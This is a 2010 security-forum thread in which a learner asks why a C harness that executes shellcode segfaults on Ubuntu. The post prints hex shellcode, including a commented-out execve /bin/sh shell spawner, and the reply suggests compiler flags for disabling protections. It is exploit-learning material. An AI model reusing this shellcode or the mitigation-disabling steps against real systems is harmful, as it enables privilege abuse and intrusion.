---
title: "Some Security Feature is Segfaulting my Stack Overflow, any ideas?"
date: 2010-09-22
forum: Security
---

### Post by oxsyn on 2010-09-22
I'm working with some basic stack overflows.  The following code compiles & runs fine in a non-ubuntu VM that's has no security features installed.  On Ubuntu 10.04 it segfaults every time.  I'm compiling on Ubuntu with the gcc -fno-stack-protector flag.  

If someone could point me to the security feature that's causing the segfaults (and how to disable it), I'd be greatly appreciative.

```
/* shellcodetest.c */

/* hello shellcode, copied from vm website */
char code[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd"\
	      "\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f";

/* hello shellcode, assembled locally */
/* char code[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80"\
	      "\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f"; */

/* shellex shellcode, copied from vm website */

/*char code[] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"\
	      "\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"\
	      "\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"\
	      "\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"\
	      "\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42";*/

/* both versions cause a segfault. */

int main(int argc, char **argv)
{
	int (*func)();
	func = (int (*)()) code;
	(int)(*func)();
}

```

---

### Post by rookcifer on 2010-09-22
Could be a result of FORTIFY_SOURCE.  Try this:

```
gcc -U_FORTIFY_SOURCE -fno-stack-protector yourcode
```

If that doesn't work, take a look at the [security features]("https://wiki.ubuntu.com/CompilerFlags") and their compiler flags.  It shows how to turn off most of them.

---

